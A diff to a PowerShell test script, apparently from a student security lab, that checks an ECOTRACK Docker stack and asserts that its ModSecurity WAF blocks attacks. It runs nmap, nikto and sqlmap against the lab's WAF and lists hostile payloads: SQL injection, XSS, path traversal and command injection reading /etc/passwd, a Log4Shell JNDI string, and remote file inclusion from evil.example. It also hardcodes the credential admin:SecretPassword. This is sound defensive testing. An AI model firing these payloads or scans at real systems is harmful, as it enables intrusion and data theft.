@@ -1,6 +1,8 @@
 #requires -Version 5.1
-# ECOTRACK - full stack smoke test (Windows 11 / Docker Desktop)
+# ECOTRACK - test end-to-end intensif (Windows 11 / Docker Desktop)
 # Run: powershell -ExecutionPolicy Bypass -File .\test-ecotrack.ps1
+# NB: la phase offensive lance de vrais scanners (nmap/wafw00f/nikto/sqlmap)
+#     via des conteneurs jetables sur le reseau dmz ; comptez 5-10 min.
 
 $ErrorActionPreference = 'Continue'
 
@@ -25,6 +27,8 @@ function Pass($m) { $script:pass++; Write-Host ("  [PASS] " + $m) -ForegroundCol
 function Fail($m) { $script:fail++; Write-Host ("  [FAIL] " + $m) -ForegroundColor Red }
 function Warn($m) { $script:warn++; Write-Host ("  [WARN] " + $m) -ForegroundColor Yellow }
 
+function NumOf($s) { $t = ("$s").Trim(); if ($t -match '^\d+$') { [int64]$t } else { [int64]0 } }
+
 function Http($url) {
   $ic = @{ Uri = $url; UseBasicParsing = $true; TimeoutSec = 8; ErrorAction = 'Stop' }
   if ($PSVersionTable.PSVersion.Major -ge 6) { $ic['SkipCertificateCheck'] = $true }
@@ -41,13 +45,20 @@ function Http($url) {
   }
 }
 
+# Status code only, for attack payloads (optionally with a custom User-Agent)
+function AttackStatus($url, $ua) {
+  $p = @{ Uri = $url; UseBasicParsing = $true; TimeoutSec = 8; ErrorAction = 'Stop' }
+  if ($ua) { $p['Headers'] = @{ 'User-Agent' = $ua } }
+  try { $r = Invoke-WebRequest @p; return [int]$r.StatusCode }
+  catch { if ($_.Exception.Response) { return [int]$_.Exception.Response.StatusCode.value__ } return 0 }
+}
+
 function PgQuery($sql) {
   $out = docker exec ecotrack-postgres psql -U ecotrack -d ecotrack -tAc $sql 2>&1
   return (($out -join "`n").Trim())
 }
 
-# Admin UIs are no longer published on the host (VPN-only). Reach them via the
-# monitoring network from a one-shot container. Returns @{ ok; body }.
+# Admin UIs are VPN-only (no host ports). Reach them via the monitoring net.
 $script:monNet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_monitoring$" | Select-Object -First 1)
 if ($script:monNet) { $script:monNet = $script:monNet.ToString().Trim() } else { $script:monNet = "filerouge3_monitoring" }
 function HttpMon($url) {
@@ -57,6 +68,12 @@ function HttpMon($url) {
   return @{ ok = $false; body = $body }
 }
 
+# Instant PromQL query via the monitoring net (no host port). Returns raw JSON text.
+function PromQuery($promql) {
+  $body = docker run --rm --network $script:monNet curlimages/curl:latest -sk --max-time 10 -G "http://172.20.4.40:9090/api/v1/query" --data-urlencode ("query=" + $promql) 2>&1
+  return (($body -join "`n"))
+}
+
 # api is debian-based: use bash /dev/tcp to probe inter-container reachability
 function TcpFromApi($ip, $port) {
   $cmd = "exec 3<>/dev/tcp/$ip/$port && echo OPEN || echo CLOSED"
@@ -64,7 +81,18 @@ function TcpFromApi($ip, $port) {
   return (($o -join '').Trim())
 }
 
-Write-Host "ECOTRACK smoke test" -ForegroundColor White
+# ModSecurity audit log line count (proxy for #events inspected)
+function ModsecLines { NumOf ((docker exec ecotrack-nginx-waf sh -c "wc -l < /var/log/nginx/modsec_audit.log 2>/dev/null || echo 0" 2>&1) -join '') }
+# Suricata alert count in eve.json
+function SuriAlertCount { NumOf ((docker exec ecotrack-suricata sh -c "grep -c event_type.:.alert /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1) -join '') }
+
+# Offensive target (WAF on the dmz net) + autodetected dmz network name
+$script:dmznet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_dmz$" | Select-Object -First 1)
+if ($script:dmznet) { $script:dmznet = $script:dmznet.ToString().Trim() } else { $script:dmznet = "filerouge3_dmz" }
+$WAFIP = "172.20.1.10"
+$WAFPORT = 8080
+
+Write-Host "ECOTRACK - test end-to-end intensif" -ForegroundColor White
 Write-Host ("PowerShell {0} | {1}" -f $PSVersionTable.PSVersion, (Get-Date)) -ForegroundColor DarkGray
 
 # --- 0. Docker available ---
@@ -73,12 +101,13 @@ docker version --format '{{.Server.Version}}' 2>&1 | Out-Null
 if ($LASTEXITCODE -eq 0) { Pass "docker daemon reachable" } else { Fail "docker daemon not reachable - is Docker Desktop running?"; Write-Host "RESULT: aborted"; exit 1 }
 
 # --- 1. Containers running / healthy ---
-Section "Containers (14 expected)"
+Section "Containers (18 attendus)"
 $expected = @(
   'ecotrack-postgres', 'ecotrack-redis', 'ecotrack-api', 'ecotrack-iot-simulator',
   'ecotrack-nginx-waf', 'ecotrack-suricata', 'ecotrack-wireguard',
   'ecotrack-wazuh-indexer', 'ecotrack-wazuh-manager', 'ecotrack-wazuh-dashboard',
-  'ecotrack-prometheus', 'ecotrack-grafana', 'ecotrack-alertmanager', 'ecotrack-node-exporter'
+  'ecotrack-prometheus', 'ecotrack-grafana', 'ecotrack-alertmanager', 'ecotrack-node-exporter',
+  'ecotrack-cadvisor', 'ecotrack-postgres-exporter', 'ecotrack-nginx-exporter', 'ecotrack-filebeat'
 )
 $running = docker ps --format '{{.Names}}'
 foreach ($n in $expected) {
@@ -141,6 +170,26 @@ if ($o -eq 'OPEN') { Pass "api -> redis 172.20.2.10:6379 OPEN (backend net)" } e
 $o = TcpFromApi '172.20.4.40' 9090
 if ($o -ne 'OPEN') { Pass "api -X-> prometheus 172.20.4.40:9090 unreachable (monitoring isolated - OK)" } else { Fail "ISOLATION BREACH: api reached monitoring net ($o)" }
 
+# --- 4b. Securite des flux capteurs (TLS via WAF, non-contournement) ---
+Section "Securite des flux capteurs (TLS via WAF)"
+$iotNet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_iot$" | Select-Object -First 1)
+if ($iotNet) { $iotNet = $iotNet.ToString().Trim() } else { $iotNet = "filerouge3_iot" }
+
+# 1. le WAF est joignable en HTTPS depuis le segment iot (chiffrement en transit)
+$code = (docker run --rm --network $iotNet curlimages/curl:latest -sk --max-time 8 -o /dev/null -w "%{http_code}" https://172.20.5.30:8443/health 2>&1) -join ''
+if ($code.Trim() -eq '200') { Pass "capteurs -> WAF en HTTPS/8443 OK (trafic chiffre TLS sur le segment iot)" } else { Warn "WAF HTTPS depuis iot code=$code (WAF pret ?)" }
+
+# 2. l_API n'est plus joignable directement depuis iot : contournement du WAF impossible
+$direct = (docker run --rm --network $iotNet curlimages/curl:latest -s --max-time 5 -o /dev/null -w "%{http_code}" http://172.20.5.20:3000/health 2>&1) -join ''
+if ($direct.Trim() -eq '000' -or $direct -match 'curl|refused|timed') { Pass "API injoignable en direct depuis iot (POST capteurs force via le WAF)" } else { Fail "API REPOND en direct depuis iot (code=$direct) - contournement du WAF possible" }
+
+# 3. un POST capteur legitime passe par le WAF en TLS et n'est pas bloque par ModSecurity
+$payload = '{"device_id":"AQ-Montmartre-0001","value":42.5,"lat":48.8867,"lon":2.3431}'
+$post = (docker run --rm --network $iotNet curlimages/curl:latest -sk --max-time 8 -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d $payload https://172.20.5.30:8443/api/iot 2>&1) -join ''
+if ($post.Trim() -match '^20[01]$') { Pass "POST capteur via WAF HTTPS -> $post (TLS OK + accepte, pas de faux positif ModSec)" }
+elseif ($post.Trim() -eq '403') { Warn "POST capteur -> 403 : ModSec bloque le trafic legitime (revoir CRS)" }
+else { Warn "POST capteur via WAF code=$post" }
+
 # --- 5. Monitoring stack (admins VPN-only: reached via monitoring net) ---
 Section "Monitoring (Prometheus / Grafana / Alertmanager / node-exporter)"
 $r = HttpMon "http://172.20.4.40:9090/-/healthy"
@@ -163,15 +212,15 @@ if ($r.ok -and $r.body) {
   catch { Warn "Grafana parse: $($r.body)" }
 } else { Fail "Grafana injoignable en interne" }
 
-$r = HttpMon "http://172.20.4.60:9093/-/healthy"
-if ($r.ok -and $r.body -match 'Healthy') { Pass "Alertmanager /-/healthy (via reseau interne)" } else { Fail "Alertmanager injoignable en interne" }
+$r = HttpMon "http://172.20.4.60:9093/api/v2/status"
+if ($r.ok -and $r.body -match 'versionInfo|cluster|uptime') { Pass "Alertmanager operationnel (api/v2/status, via reseau interne)" } else { Fail "Alertmanager injoignable en interne" }
 
 $r = HttpMon "http://172.20.4.70:9100/metrics"
 if ($r.ok -and $r.body -match 'node_') { Pass "node-exporter /metrics OK (via reseau interne)" } else { Fail "node-exporter injoignable en interne" }
 
 # --- 6. Perimeter IDS / VPN ---
 Section "IDS / VPN"
-$ver = (docker exec ecotrack-suricata suricata --version 2>&1) -join ' '
+$ver = (docker exec ecotrack-suricata suricata -V 2>&1) -join ' '
 if ($ver -match 'Suricata') { Pass "suricata: $($ver.Trim())" } else { Warn "suricata version: $ver" }
 $proc = (docker exec ecotrack-suricata sh -c "ps -e 2>/dev/null | grep -i suricat | grep -v grep" 2>&1) -join ''
 if ($proc) { Pass "suricata process running (af-packet eth0)" } else { Warn "suricata process not confirmed - check 'docker logs ecotrack-suricata'" }
@@ -231,16 +280,65 @@ if ($acc -match '^\s*\d+') { Pass "nginx access.log present ($($acc.Trim()) lign
 $idx = (docker exec ecotrack-wazuh-indexer curl -sk -u admin:SecretPassword "https://localhost:9200/_cat/indices/ecotrack-*?h=index" 2>&1) -join "`n"
 if ($idx -match 'ecotrack-') { Pass "index ecotrack-* present dans wazuh-indexer (Filebeat ingere)" } else { Warn "aucun index ecotrack-* encore - genere du trafic + attendre ~1 min" }
 
-# --- 10. Chantier 3: detection + generation d'alertes ---
-Section "Chantier 3 - Detection (genere des alertes)"
+# --- 10. KPI / metriques (verifie les corrections recentes des panels Grafana) ---
+Section "KPI / metriques (panels Grafana)"
+$jf = PromQuery "iot_fleet_size"
+$fleet = 0; try { $rf = @(($jf | ConvertFrom-Json).data.result); if ($rf.Count) { $fleet = [int][double]$rf[0].value[1] } } catch {}
+if ($fleet -ge 2000) { Pass "flotte IoT = $fleet capteurs (>=2000)" } elseif ($fleet -gt 0) { Warn "flotte IoT = $fleet (attendu >=2000 - simulator a jour ?)" } else { Warn "iot_fleet_size absent" }
+
+$ja = PromQuery "iot_active_sensors"
+$act = 0; try { $ra = @(($ja | ConvertFrom-Json).data.result); if ($ra.Count) { $act = [int][double]$ra[0].value[1] } } catch {}
+if ($act -gt 0) { Pass "capteurs actifs = $act" } else { Warn "iot_active_sensors absent (warm-up)" }
+
+$jt = PromQuery "count(count by (sensor_type) (iot_value_avg))"
+$nt = 0; try { $rt = @(($jt | ConvertFrom-Json).data.result); if ($rt.Count) { $nt = [int][double]$rt[0].value[1] } } catch {}
+if ($nt -ge 5) { Pass "types de capteurs instrumentes = $nt (agregats par type OK)" } else { Warn "types de capteurs = $nt (attendu >=5)" }
+
+$jan = PromQuery "sum(iot_anomaly_active)"
+$an = -1; try { $ran = @(($jan | ConvertFrom-Json).data.result); if ($ran.Count) { $an = [int][double]$ran[0].value[1] } } catch {}
+if ($an -ge 0) { Pass "metrique anomalies active exposee (anomalies en cours: $an)" } else { Warn "iot_anomaly_active absent" }
+
+$j = PromQuery "iot_post_errors_total"
+$n = 0; try { $n = @(($j | ConvertFrom-Json).data.result).Count } catch {}
+if ($n -gt 0) { Pass "iot_post_errors_total expose : $n series (panel 'Taux d erreur' alimente)" } else { Warn "iot_post_errors_total absent - simulator pas a jour / pas encore d'erreur injectee" }
+
+$jr = PromQuery "sum(iot_readings_sent_total)"
+$je = PromQuery "sum(iot_post_errors_total)"
+$tot = 0.0; $err = 0.0
+try { $rr = @(($jr | ConvertFrom-Json).data.result); if ($rr.Count) { $tot = [double]$rr[0].value[1] } } catch {}
+try { $re = @(($je | ConvertFrom-Json).data.result); if ($re.Count) { $err = [double]$re[0].value[1] } } catch {}
+if ($tot -gt 0) {
+  $rate = [math]::Round(($err / ($tot + $err)) * 100, 2)
+  if ($rate -le 5) { Pass "taux d'erreur IoT bas : $rate% ($err err / $tot ok) - conforme (~1% cible)" }
+  else { Warn "taux d'erreur IoT = $rate% (attendu ~1%) - verifier SIM_ERROR_RATE" }
+} else { Warn "pas encore de lectures comptees (warm-up)" }
+
+$ju = PromQuery "time() - pg_postmaster_start_time_seconds"
+$okU = $false; $upv = 0.0
+try { $ru = @(($ju | ConvertFrom-Json).data.result); if ($ru.Count) { $okU = $true; $upv = [double]$ru[0].value[1] } } catch {}
+if ($okU) { Pass ("pg_postmaster_start_time_seconds expose (uptime ~{0}s; --collector.postmaster actif)" -f [int]$upv) } else { Warn "pg uptime absent - ajouter --collector.postmaster a postgres-exporter" }
+
+$jc = PromQuery "container_memory_usage_bytes"
+$dk = 0; try { $dk = @(($jc | ConvertFrom-Json).data.result | Where-Object { $_.metric.id -match 'docker' }).Count } catch {}
+if ($dk -gt 0) { Pass "cAdvisor: $dk series conteneur indexees par 'id' (panels Mem/CPU alimentes; label 'name' vide sur WSL2)" } else { Warn "cAdvisor: aucune serie id~docker - voir limitation WSL2" }
+
+$cr = NumOf ((docker exec ecotrack-suricata sh -c "grep -c . /var/lib/suricata/rules/ecotrack-combined.rules 2>/dev/null || echo 0" 2>&1) -join '')
+if ($cr -ge 50000) { Pass "Suricata ruleset combine : $cr regles chargees (ET Open + local)" }
+elseif ($cr -gt 12) { Warn "ruleset combine = $cr (ET Open peut-etre absent, repli local)" }
+else { Warn "ruleset combine introuvable: $cr" }
+
+$pgI = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -u admin:SecretPassword 'https://localhost:9200/_cat/indices/ecotrack-postgres-*?h=index,docs.count'" 2>&1) -join "`n"
+if ($pgI -match 'ecotrack-postgres') { Pass "index ecotrack-postgres-* present (logs PostgreSQL lisibles ingeres)" } else { Warn "index ecotrack-postgres-* absent" }
+$wgI = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -u admin:SecretPassword 'https://localhost:9200/_cat/indices/ecotrack-wireguard-*?h=index,docs.count'" 2>&1) -join "`n"
+if ($wgI -match 'ecotrack-wireguard') { Pass "index ecotrack-wireguard-* present (stdout WireGuard ingere)" } else { Warn "index ecotrack-wireguard-* absent" }
+
+# --- 11. Chantier 3: detection (alimente Suricata + ModSec) ---
+Section "Chantier 3 - Detection"
 $rc = (docker exec ecotrack-wazuh-manager sh -c "grep -c 'rule id' /var/ossec/etc/rules/local_rules.xml" 2>&1) -join ''
-if ($rc -match '^\s*5') { Pass "wazuh local_rules.xml monte (5 regles de correlation)" } else { Warn "local_rules.xml: $rc regle(s) detectee(s)" }
+$rcN = NumOf ($rc.Trim())
+if ($rcN -ge 5) { Pass "wazuh local_rules.xml monte ($rcN regles de correlation)" } else { Warn "local_rules.xml: $rcN regle(s) detectee(s) (attendu >=5)" }
 
-$ev0 = (docker exec ecotrack-suricata sh -c "test -f /var/log/suricata/eve.json && wc -l < /var/log/suricata/eve.json || echo 0" 2>&1) -join ''
-
-function NumOf($s) { $t = ("$s").Trim(); if ($t -match '^\d+$') { [int64]$t } else { [int64]0 } }
-
-Write-Host "  [..] injection SQLi + sqlmap UA via le WAF (http://localhost)..." -ForegroundColor DarkGray
+Write-Host "  [..] injection SQLi + sqlmap UA + OR 1=1 via le WAF (http://localhost)..." -ForegroundColor DarkGray
 try { Invoke-WebRequest -Uri "http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--" -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop | Out-Null } catch {}
 try { Invoke-WebRequest -Uri "http://localhost/api/iot/latest" -Headers @{ 'User-Agent' = 'sqlmap/1.7.2' } -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop | Out-Null } catch {}
 try { 1..6 | ForEach-Object { Invoke-WebRequest -Uri "http://localhost/api/iot/latest?x=$_%27%20OR%20%271%27=%271" -UseBasicParsing -TimeoutSec 6 -ErrorAction Stop | Out-Null } } catch {}
@@ -251,37 +349,65 @@ if ($suriRun -match 'true') {
   $ev1 = NumOf (docker exec ecotrack-suricata sh -c "wc -l < /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1)
   if ($ev1 -gt 0) { Pass "suricata eve.json alimente ($ev1 lignes) - sidecar voit l'ingress WAF" } else { Warn "eve.json vide - verifier interface (docker exec ecotrack-suricata ip -o -4 addr)" }
   $alerts = NumOf (docker exec ecotrack-suricata sh -c "grep -c event_type.:.alert /var/log/suricata/eve.json 2>/dev/null || echo 0" 2>&1)
-  if ($alerts -gt 0) { Pass "suricata: $alerts alerte(s) IDS levee(s) sur regles ECOTRACK" } else { Warn "0 alerte IDS - capture sidecar ne voit pas le trafic, voir notes interface" }
+  if ($alerts -gt 0) { Pass "suricata: $alerts alerte(s) IDS levee(s)" } else { Warn "0 alerte IDS - capture sidecar ne voit pas le trafic, voir notes interface" }
 } else {
   Warn "suricata pas 'running' (state=$suriRun) - eve.json non verifie, corriger le conteneur d'abord"
 }
 
 $mods = NumOf (docker exec ecotrack-nginx-waf sh -c "test -f /var/log/nginx/modsec_audit.log && grep -c '9000001' /var/log/nginx/modsec_audit.log || echo 0" 2>&1)
-if ($mods -gt 0) { Pass "ModSecurity: $mods hit(s) regle 9000001 (SQLi /api) dans modsec_audit.log" } else { Warn "0 hit ModSec custom 9000001 - voir 'tail modsec_audit.log' (CRS natif 942xxx a pu matcher avant)" }
+if ($mods -gt 0) { Pass "ModSecurity: $mods hit(s) regle 9000001 (SQLi /api) dans modsec_audit.log" } else { Warn "0 hit ModSec custom 9000001 - CRS natif 942xxx a pu matcher avant" }
 
-# --- 11. Wazuh: bruit SCA coupe + alertes securite cote manager ---
-Section "Wazuh - Alertes (SCA coupe + detection)"
+# --- 12. Pentest offensif intensif (vrais outils via le reseau dmz) ---
+Section "Pentest offensif intensif (nmap / wafw00f / nikto / sqlmap)"
+Write-Host "  [..] phase offensive : pull d'images + scans reels, comptez 5-10 min" -ForegroundColor DarkGray
+$modsecBefore = ModsecLines
+$suriBefore = SuriAlertCount
+
+Write-Host "  [..] nmap : scan de ports + detection de versions sur $WAFIP ..." -ForegroundColor DarkGray
+$nmapRecon = (docker run --rm --network $script:dmznet instrumentisto/nmap -Pn -T4 --host-timeout 120s -p 1-1024,3000,8080,8443 -sV $WAFIP 2>&1 | Out-String)
+if ($nmapRecon -match '8080/tcp\s+open') { Pass "nmap: port WAF 8080/tcp ouvert et detecte" } else { Warn "nmap: 8080/tcp non vu ouvert (timeout/pull image ?)" }
+if ($nmapRecon -match '3000/tcp\s+open') { Fail "nmap: backend 3000/tcp EXPOSE sur le WAF (segmentation a revoir)" } else { Pass "nmap: backend 3000/tcp non expose sur l'IP WAF (segmentation OK)" }
+
+Write-Host "  [..] nmap NSE : http-waf-detect / http-sql-injection / http-enum ..." -ForegroundColor DarkGray
+$nmapNse = (docker run --rm --network $script:dmznet instrumentisto/nmap -Pn -T4 --host-timeout 150s -p $WAFPORT --script http-waf-detect,http-waf-fingerprint,http-sql-injection,http-enum,http-methods $WAFIP 2>&1 | Out-String)
+if ($nmapNse -match 'WAF|firewall|IDS/IPS|ModSecurity|protected') { Pass "nmap NSE: presence d'un WAF/IPS detectee devant l'application" } else { Warn "nmap NSE: WAF non explicitement detecte (script possiblement bloque)" }
+
+Write-Host "  [..] wafw00f : fingerprinting du WAF ..." -ForegroundColor DarkGray
+$wafw = (docker run --rm --network $script:dmznet python:3-slim sh -c "pip install --quiet --root-user-action=ignore wafw00f >/dev/null 2>&1; wafw00f http://${WAFIP}:${WAFPORT} 2>&1 | tail -20" 2>&1 | Out-String)
+if ($wafw -match 'ModSecurity') { Pass "wafw00f: WAF identifie = ModSecurity" }
+elseif ($wafw -match 'is behind|seems to be behind|behind a WAF|WAF') { Pass "wafw00f: presence d'un WAF confirmee" }
+else { Warn "wafw00f: pas de WAF identifie (derniere ligne: $((($wafw -split "`n") | Where-Object { $_ -ne '' } | Select-Object -Last 1)))" }
+
+Write-Host "  [..] nikto : scan web intensif (max 120s) ..." -ForegroundColor DarkGray
+$nikto = (docker run --rm --network $script:dmznet sullo/nikto -h http://${WAFIP}:${WAFPORT} -ask no -maxtime 120s 2>&1 | Out-String)
+$modsecAfterNikto = ModsecLines
+$niktoDelta = $modsecAfterNikto - $modsecBefore
+if ($niktoDelta -gt 20) { Pass "nikto: le WAF a inspecte/journalise +$niktoDelta evenements pendant le scan" }
+elseif ($nikto -match 'tested|items checked|requests|Nikto') { Pass "nikto: scan execute (WAF actif devant l'app)" }
+else { Warn "nikto: peu d'evenements WAF (+$niktoDelta) - pull image ou reseau ?" }
+
+Write-Host "  [..] sqlmap : injection SQL automatisee (--level 2 --risk 2) ..." -ForegroundColor DarkGray
+$sqlmap = (docker run --rm --network $script:dmznet python:3-slim sh -c "pip install --quiet --root-user-action=ignore sqlmap >/dev/null 2>&1; sqlmap -u 'http://${WAFIP}:${WAFPORT}/api/iot/latest?id=1' --batch --flush-session --level=2 --risk=2 --technique=BEU --threads=4 2>&1 | tail -30" 2>&1 | Out-String)
+if ($sqlmap -match 'WAF/IPS|403|Forbidden|blocked|not be injectable|do not appear') { Pass "sqlmap: injections neutralisees par le WAF (403/blocage detecte)" }
+elseif ($sqlmap -match 'is injectable|injectable\b|available databases') { Fail "sqlmap: parametre potentiellement injectable - revoir WAF/CRS" }
+else { Warn "sqlmap: resultat non concluant (timeout/pull ?)" }
+
+$modsecAfter = ModsecLines
+$suriAfter = SuriAlertCount
+$mDelta = $modsecAfter - $modsecBefore
+$sDelta = $suriAfter - $suriBefore
+if ($mDelta -gt 0) { Pass "ModSecurity: +$mDelta evenements journalises pendant la phase offensive" } else { Warn "ModSecurity: aucun nouvel evenement (verifier audit log)" }
+if ($sDelta -gt 0) { Pass "Suricata: +$sDelta alertes IDS pendant la phase offensive (local + ET Open)" } else { Warn "Suricata: aucune nouvelle alerte (capture/sidecar ?)" }
+
+# --- 13. Wazuh: bruit SCA coupe + alertes securite cote manager ---
+Section "Wazuh - Alertes (SCA coupe + escalade)"
 $sca = (docker exec ecotrack-wazuh-manager sh -c "grep -A2 '<sca>' /var/ossec/etc/ossec.conf | grep -c '<enabled>no</enabled>'" 2>&1) -join ''
 if ($sca.Trim() -eq '1') { Pass "module SCA desactive dans ossec.conf (plus de bruit CIS)" } else { Warn "SCA pas confirme desactive - verifier montage wazuh_manager.conf" }
 
-$lf = (docker exec ecotrack-wazuh-manager sh -c "grep -c 'ecotrack_access.log\|suricata/eve.json' /var/ossec/etc/ossec.conf" 2>&1) -join ''
-if (([int]($lf.Trim() -replace '\D','')) -ge 2) { Pass "localfile nginx + suricata injectes dans le manager (logs -> analysisd)" } else { Warn "localfile ECOTRACK absents de ossec.conf" }
+$lf = (docker exec ecotrack-wazuh-manager sh -c "grep -c 'ecotrack_access.log\|modsec_audit.log' /var/ossec/etc/ossec.conf" 2>&1) -join ''
+if (([int]($lf.Trim() -replace '\D','')) -ge 2) { Pass "localfile nginx + modsec injectes dans le manager (logs -> analysisd)" } else { Warn "localfile ECOTRACK absents de ossec.conf" }
 
-Write-Host "  [..] generation d'alertes (SQLi/scanner) cote manager..." -ForegroundColor DarkGray
-try { 1..8 | ForEach-Object { Invoke-WebRequest -Uri "http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--" -UseBasicParsing -TimeoutSec 6 -ErrorAction Stop | Out-Null } } catch {}
-try { 1..4 | ForEach-Object { Invoke-WebRequest -Uri "http://localhost/api/iot/latest" -Headers @{ 'User-Agent' = 'sqlmap/1.7.2' } -UseBasicParsing -TimeoutSec 6 -ErrorAction Stop | Out-Null } } catch {}
-
-# reseau dmz du projet (autodetection du prefixe compose)
-$dmznet = (docker network ls --format "{{.Name}}" | Select-String -Pattern "_dmz$" | Select-Object -First 1).ToString().Trim()
-if (-not $dmznet) { $dmznet = "filerouge3_dmz" }
-$wafip = "172.20.1.10"
-
-Write-Host "  [..] scan nmap (docker instrumentisto/nmap) sur $wafip via $dmznet ..." -ForegroundColor DarkGray
-docker run --rm --network $dmznet instrumentisto/nmap -Pn -T4 -p 1-300,8080,8443 --script http-sql-injection $wafip 2>&1 | Out-Null
-
-Write-Host "  [..] scan sqlmap (docker python:3-slim + pip) ..." -ForegroundColor DarkGray
-docker run --rm --network $dmznet python:3-slim sh -c "pip install --quiet --root-user-action=ignore sqlmap >/dev/null 2>&1; sqlmap -u 'http://$wafip`:8080/api/iot/latest?id=1' --batch --flush-session --level=1 --risk=1 --technique=B --threads=4 2>&1 | tail -3" 2>&1 | Out-Null
-
+Write-Host "  [..] consolidation des alertes (laisser analysisd decoder)..." -ForegroundColor DarkGray
 Start-Sleep -Seconds 15
 
 $res = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:>=6 AND NOT rule.groups:sca'" 2>&1) -join ''
@@ -296,7 +422,7 @@ if ($sc -eq 0) { Pass "bruit SCA = 0 (module coupe, index purge)" } else { Warn 
 
 $crit = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:>=12'" 2>&1) -join ''
 $cc = 0; if ($crit -match '"count":(\d+)') { $cc = [int]$Matches[1] }
-if ($cc -gt 0) { Pass "wazuh-alerts CRITICAL (niveau>=12): $cc" } else { Warn "0 alerte critical - lancer les scans nmap/sqlmap (section suivante) puis relancer" }
+if ($cc -gt 0) { Pass "wazuh-alerts CRITICAL (niveau>=12): $cc" } else { Warn "0 alerte critical - relancer apres la phase offensive" }
 
 $high = (docker exec ecotrack-wazuh-indexer sh -c "curl -sk -G -u admin:SecretPassword 'https://localhost:9200/wazuh-alerts-*/_count' --data-urlencode 'q=rule.level:[8 TO 11]'" 2>&1) -join ''
 $hc = 0; if ($high -match '"count":(\d+)') { $hc = [int]$Matches[1] }
@@ -308,30 +434,51 @@ foreach ($rid in @('100110','100111','100112','100113','31103','31106')) {
   if ($rc2 -gt 0) { Pass "regle Wazuh $rid declenchee x$rc2" }
 }
 
-# --- 12bis. Block mode: ModSecurity bloque (403), statut IDS/IPS ---
-Section "Block mode - WAF (ModSecurity On) + IDS/IPS"
+# --- 14. Block mode: batterie d'attaques par classe (assertions 403) ---
+Section "Block mode - WAF (ModSecurity On) : batterie d'attaques"
 $eng = (docker exec ecotrack-nginx-waf sh -c "env | grep -i MODSEC_RULE_ENGINE" 2>&1) -join ''
 if ($eng -match '=\s*On') { Pass "ModSecurity engine = On (blocage actif)" } else { Warn "MODSEC_RULE_ENGINE != On ($eng)" }
 
 $benign = Http "http://localhost/api/iot/latest"
 if ($benign.code -eq 200) { Pass "trafic legitime -> 200 (pas de faux positif)" } else { Warn "trafic legitime code=$($benign.code) (faux positif WAF ?)" }
 
-$code = 0
-try { $x = Invoke-WebRequest -Uri "http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--" -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop; $code = [int]$x.StatusCode } catch { if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode.value__ } }
-if ($code -eq 403) { Pass "SQLi sur /api -> 403 (ModSecurity BLOQUE)" } else { Warn "SQLi code=$code (attendu 403 - verifier engine/CRS)" }
+# attaques couvertes par regles custom : blocage ferme (Fail si != 403)
+$firm = @(
+  @{ n='SQLi UNION (/api)'; u='http://localhost/api/iot/latest?id=1%20UNION%20SELECT%20username,password%20FROM%20pg_user--'; ua=$null },
+  @{ n='SQLi OR 1=1 (/api)'; u='http://localhost/api/iot/latest?id=1%20OR%201=1--'; ua=$null },
+  @{ n='SQLi stacked pg_sleep (/api)'; u='http://localhost/api/iot/latest?id=1%3BSELECT%20pg_sleep(3)--'; ua=$null },
+  @{ n='Scanner UA sqlmap'; u='http://localhost/'; ua='sqlmap/1.7' },
+  @{ n='Scanner UA nikto'; u='http://localhost/'; ua='Nikto/2.5' },
+  @{ n='Scanner UA nuclei'; u='http://localhost/'; ua='Nuclei' },
+  @{ n='Scanner UA masscan'; u='http://localhost/'; ua='masscan/1.3' }
+)
+foreach ($a in $firm) {
+  $code = AttackStatus $a.u $a.ua
+  if ($code -eq 403) { Pass "$($a.n) -> 403 (BLOQUE)" } else { Fail "$($a.n) -> $code (attendu 403)" }
+}
 
-$code2 = 0
-try { $x = Invoke-WebRequest -Uri "http://localhost/api/iot/latest" -Headers @{ 'User-Agent' = 'sqlmap/1.7' } -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop; $code2 = [int]$x.StatusCode } catch { if ($_.Exception.Response) { $code2 = [int]$_.Exception.Response.StatusCode.value__ } }
-if ($code2 -eq 403) { Pass "scanner sqlmap -> 403 (BLOQUE)" } else { Warn "scanner code=$code2 (attendu 403)" }
+# attaques generiques : dependent du score CRS (blocage majoritaire attendu)
+$crsAtt = @(
+  @{ n='XSS <script>'; u='http://localhost/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'; ua=$null },
+  @{ n='XSS img onerror'; u='http://localhost/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'; ua=$null },
+  @{ n='Path traversal'; u='http://localhost/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd'; ua=$null },
+  @{ n='Command injection'; u='http://localhost/?cmd=%3Bcat%20%2Fetc%2Fpasswd'; ua=$null },
+  @{ n='Log4Shell (UA)'; u='http://localhost/'; ua='${jndi:ldap://x/a}' },
+  @{ n='RFI shell.txt'; u='http://localhost/?page=http%3A%2F%2Fevil.example%2Fshell.txt'; ua=$null }
+)
+$blk = 0
+foreach ($a in $crsAtt) { if ((AttackStatus $a.u $a.ua) -eq 403) { $blk++ } }
+if ($blk -ge [math]::Ceiling($crsAtt.Count / 2)) { Pass "CRS: $blk/$($crsAtt.Count) classes generiques bloquees (403)" }
+elseif ($blk -gt 0) { Warn "CRS: $blk/$($crsAtt.Count) bloquees (paranoia 1 - acceptable, regle custom couvre /api)" }
